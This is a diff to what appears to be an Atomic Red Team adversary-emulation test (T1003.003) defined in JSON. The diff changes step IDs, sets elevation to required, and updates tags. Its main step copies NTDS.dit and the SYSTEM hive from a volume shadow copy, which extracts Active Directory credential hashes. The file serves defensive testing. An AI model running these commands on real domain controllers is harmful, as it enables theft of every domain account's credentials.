@@ -7,25 +7,25 @@
   ],
   "steps": [
     {
-      "id": "2db1885d-fab1-465a-9312-0924099a3e74",
+      "id": "7acc9c99-b8ef-425f-a3f3-90c193a4a5e9",
       "type": "execute-command",
       "data": {
         "command": "copy #{vsc_name}\\Windows\\NTDS\\NTDS.dit #{extract_path}\\ntds.dit\ncopy #{vsc_name}\\Windows\\System32\\config\\SYSTEM #{extract_path}\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE\n",
         "command_type": "command_prompt"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "2fbfde95-908d-47d4-b1ed-afac2e5139bb",
+      "id": "21a15a9d-1cb5-427f-80e9-204b14bb73d4",
       "type": "execute-command",
       "data": {
         "command": "del \"#{extract_path}\\ntds.dit\"        \u003enul 2\u003e nul\ndel \"#{extract_path}\\VSC_SYSTEM_HIVE\" \u003enul 2\u003e nul\ndel \"#{extract_path}\\SYSTEM_HIVE\"     \u003enul 2\u003e nul\n",
         "command_type": "command_prompt"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "27246938-1e7a-459c-abf1-cb23a233abb4",
+      "id": "937004c1-3162-4dda-be6f-5ef82e29990f",
       "name": "Check dependency 1/3",
       "description": "Target must be a Domain Controller\n",
       "type": "execute-command",
@@ -33,10 +33,10 @@
         "command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "bb26dd2c-9998-4fee-b623-86c9d102d60c",
+      "id": "78c07ca1-4c84-4d26-b151-ceed3b801621",
       "name": "Resolve dependency 1/3",
       "description": "Target must be a Domain Controller\n",
       "type": "execute-command",
@@ -44,10 +44,10 @@
         "command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "489adbe2-bc06-4c60-bbc4-4b9389888a61",
+      "id": "4ebaf18e-4e9e-4c03-9e8a-c540c03688df",
       "name": "Re-check dependency 1/3",
       "description": "Target must be a Domain Controller\n",
       "type": "execute-command",
@@ -55,10 +55,10 @@
         "command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "5d4d1522-43d3-4278-b43f-e39bf404b8c1",
+      "id": "85a9f004-0b5e-4dff-930f-a7508014c57a",
       "name": "Check dependency 2/3",
       "description": "Volume shadow copy must exist\n",
       "type": "execute-command",
@@ -66,10 +66,10 @@
         "command": "if not exist #{vsc_name} (exit /b 1)\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "5822fa4f-b974-4337-9085-a2cc500eaee4",
+      "id": "2f435680-bdb2-4346-8e62-592169ca2812",
       "name": "Resolve dependency 2/3",
       "description": "Volume shadow copy must exist\n",
       "type": "execute-command",
@@ -77,10 +77,10 @@
         "command": "echo Run \"Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'\" to fulfill this requirement\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "d6b03d7f-5bdd-46ad-8cc2-56a743b96baf",
+      "id": "61b91807-be6a-4278-924e-7a1dcafd0ca3",
       "name": "Re-check dependency 2/3",
       "description": "Volume shadow copy must exist\n",
       "type": "execute-command",
@@ -88,10 +88,10 @@
         "command": "if not exist #{vsc_name} (exit /b 1)\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "740b564d-f449-46f4-b3a6-7f5896e739a1",
+      "id": "e93af82c-7797-4fbf-814f-1cdc2b95af81",
       "name": "Check dependency 3/3",
       "description": "Extract path must exist\n",
       "type": "execute-command",
@@ -99,10 +99,10 @@
         "command": "if not exist #{extract_path} (exit /b 1)\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "4fa76d38-b702-4c6e-9fc8-d30d5510a6c9",
+      "id": "a890d949-e953-40b7-a53a-a234c78f1861",
       "name": "Resolve dependency 3/3",
       "description": "Extract path must exist\n",
       "type": "execute-command",
@@ -110,10 +110,10 @@
         "command": "mkdir #{extract_path}\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "1b2ce69c-cbe6-48d6-a546-d4ad6439fb74",
+      "id": "0307072c-ae22-4287-a01e-6bb96fb287ef",
       "name": "Re-check dependency 3/3",
       "description": "Extract path must exist\n",
       "type": "execute-command",
@@ -121,84 +121,84 @@
         "command": "if not exist #{extract_path} (exit /b 1)\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "2db1885d-fab1-465a-9312-0924099a3e74",
+      "s": "7acc9c99-b8ef-425f-a3f3-90c193a4a5e9",
       "p": "on-success",
-      "o": "2fbfde95-908d-47d4-b1ed-afac2e5139bb"
+      "o": "21a15a9d-1cb5-427f-80e9-204b14bb73d4"
     },
     {
-      "s": "2db1885d-fab1-465a-9312-0924099a3e74",
+      "s": "7acc9c99-b8ef-425f-a3f3-90c193a4a5e9",
       "p": "on-failure",
-      "o": "2fbfde95-908d-47d4-b1ed-afac2e5139bb"
+      "o": "21a15a9d-1cb5-427f-80e9-204b14bb73d4"
     },
     {
-      "s": "27246938-1e7a-459c-abf1-cb23a233abb4",
+      "s": "937004c1-3162-4dda-be6f-5ef82e29990f",
       "p": "on-success",
-      "o": "2db1885d-fab1-465a-9312-0924099a3e74"
+      "o": "7acc9c99-b8ef-425f-a3f3-90c193a4a5e9"
     },
     {
-      "s": "27246938-1e7a-459c-abf1-cb23a233abb4",
+      "s": "937004c1-3162-4dda-be6f-5ef82e29990f",
       "p": "on-failure",
-      "o": "bb26dd2c-9998-4fee-b623-86c9d102d60c"
+      "o": "78c07ca1-4c84-4d26-b151-ceed3b801621"
     },
     {
-      "s": "bb26dd2c-9998-4fee-b623-86c9d102d60c",
+      "s": "78c07ca1-4c84-4d26-b151-ceed3b801621",
       "p": "on-success",
-      "o": "489adbe2-bc06-4c60-bbc4-4b9389888a61"
+      "o": "4ebaf18e-4e9e-4c03-9e8a-c540c03688df"
     },
     {
-      "s": "489adbe2-bc06-4c60-bbc4-4b9389888a61",
+      "s": "4ebaf18e-4e9e-4c03-9e8a-c540c03688df",
       "p": "on-failure",
-      "o": "2db1885d-fab1-465a-9312-0924099a3e74"
+      "o": "7acc9c99-b8ef-425f-a3f3-90c193a4a5e9"
     },
     {
-      "s": "5d4d1522-43d3-4278-b43f-e39bf404b8c1",
+      "s": "85a9f004-0b5e-4dff-930f-a7508014c57a",
       "p": "on-success",
-      "o": "2db1885d-fab1-465a-9312-0924099a3e74"
+      "o": "7acc9c99-b8ef-425f-a3f3-90c193a4a5e9"
     },
     {
-      "s": "5d4d1522-43d3-4278-b43f-e39bf404b8c1",
+      "s": "85a9f004-0b5e-4dff-930f-a7508014c57a",
       "p": "on-failure",
-      "o": "5822fa4f-b974-4337-9085-a2cc500eaee4"
+      "o": "2f435680-bdb2-4346-8e62-592169ca2812"
     },
     {
-      "s": "5822fa4f-b974-4337-9085-a2cc500eaee4",
+      "s": "2f435680-bdb2-4346-8e62-592169ca2812",
       "p": "on-success",
-      "o": "d6b03d7f-5bdd-46ad-8cc2-56a743b96baf"
+      "o": "61b91807-be6a-4278-924e-7a1dcafd0ca3"
     },
     {
-      "s": "d6b03d7f-5bdd-46ad-8cc2-56a743b96baf",
+      "s": "61b91807-be6a-4278-924e-7a1dcafd0ca3",
       "p": "on-failure",
-      "o": "2db1885d-fab1-465a-9312-0924099a3e74"
+      "o": "7acc9c99-b8ef-425f-a3f3-90c193a4a5e9"
     },
     {
-      "s": "740b564d-f449-46f4-b3a6-7f5896e739a1",
+      "s": "e93af82c-7797-4fbf-814f-1cdc2b95af81",
       "p": "on-success",
-      "o": "2db1885d-fab1-465a-9312-0924099a3e74"
+      "o": "7acc9c99-b8ef-425f-a3f3-90c193a4a5e9"
     },
     {
-      "s": "740b564d-f449-46f4-b3a6-7f5896e739a1",
+      "s": "e93af82c-7797-4fbf-814f-1cdc2b95af81",
       "p": "on-failure",
-      "o": "4fa76d38-b702-4c6e-9fc8-d30d5510a6c9"
+      "o": "a890d949-e953-40b7-a53a-a234c78f1861"
     },
     {
-      "s": "4fa76d38-b702-4c6e-9fc8-d30d5510a6c9",
+      "s": "a890d949-e953-40b7-a53a-a234c78f1861",
       "p": "on-success",
-      "o": "1b2ce69c-cbe6-48d6-a546-d4ad6439fb74"
+      "o": "0307072c-ae22-4287-a01e-6bb96fb287ef"
     },
     {
-      "s": "1b2ce69c-cbe6-48d6-a546-d4ad6439fb74",
+      "s": "0307072c-ae22-4287-a01e-6bb96fb287ef",
       "p": "on-failure",
-      "o": "2db1885d-fab1-465a-9312-0924099a3e74"
+      "o": "7acc9c99-b8ef-425f-a3f3-90c193a4a5e9"
     }
   ],
   "tags": [
-    "T1003.003",
-    "atomic-red-team"
+    "T1003",
+    "T1003.003"
   ],
   "input_arguments": [
     {
